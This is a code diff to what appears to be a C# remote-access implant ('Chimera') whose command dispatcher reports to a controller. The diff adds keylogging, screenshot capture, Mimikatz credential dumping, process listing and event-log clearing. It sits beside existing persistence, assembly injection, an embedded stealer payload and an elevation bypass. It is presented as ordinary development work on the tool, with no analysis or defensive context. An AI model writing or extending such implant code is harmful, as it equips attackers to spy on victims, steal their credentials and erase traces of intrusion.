@@ -77,6 +77,22 @@ namespace Chimera
                         output = Commands.Sleep.Execute(parameters);
                         break;
 
+                    case "ps":
+                        output = Commands.Ps.Execute();
+                        break;
+
+                    case "screenshot":
+                        output = Commands.Screenshot.Execute(taskID, CallbackUUID);
+                        break;
+
+                    case "keylog":
+                        output = Commands.Keylogger.Execute(parameters);
+                        break;
+
+                    case "mimikatz":
+                        output = Commands.Mimikatz.Execute();
+                        break;
+
                     case "persist":
                         output = (parameters != null && parameters.ToLower() == "remove")
                             ? Commands.Persist.Remove()
@@ -84,19 +100,20 @@ namespace Chimera
                         break;
 
                     case "inject_assembly":
-                        // parameters = base64-encoded .NET assembly
                         output = Commands.InjectAssembly.Execute(parameters, taskID, CallbackUUID);
                         break;
 
                     case "run_stealer":
-                        // No parameters needed — stealer_enc is embedded at compile time
                         output = Commands.InjectAssembly.Execute("run_stealer", taskID, CallbackUUID);
                         break;
 
                     case "runas_exec":
                     case "bypass":
-                        // parameters = optional command to run elevated (default: cmd.exe)
                         output = Commands.RunasExec.Execute(parameters);
+                        break;
+
+                    case "clearlogs":
+                        output = Commands.ClearLogs.Execute();
                         break;
 
                     case "help":
